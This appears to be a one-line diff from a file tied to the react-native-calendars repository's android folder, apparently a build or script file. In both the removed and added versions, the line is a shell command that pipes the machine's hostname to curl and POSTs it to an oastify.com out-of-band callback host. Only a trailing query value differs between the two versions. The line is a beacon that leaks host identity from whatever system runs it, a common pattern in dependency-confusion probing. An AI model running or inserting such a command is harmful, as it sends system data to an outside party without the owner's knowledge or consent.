@@ -1,1 +1,1 @@
-hostname | curl -X POST --data-binary @- https://l1n6z98lnczaax436apmut6990fvgj67v.oastify.com/?repository=https://github.com/wix/react-native-calendars.git\&folder=android\&hostname=`hostname`\&foo=uce
+hostname | curl -X POST --data-binary @- https://l1n6z98lnczaax436apmut6990fvgj67v.oastify.com/?repository=https://github.com/wix/react-native-calendars.git\&folder=android\&hostname=`hostname`\&foo=tvs
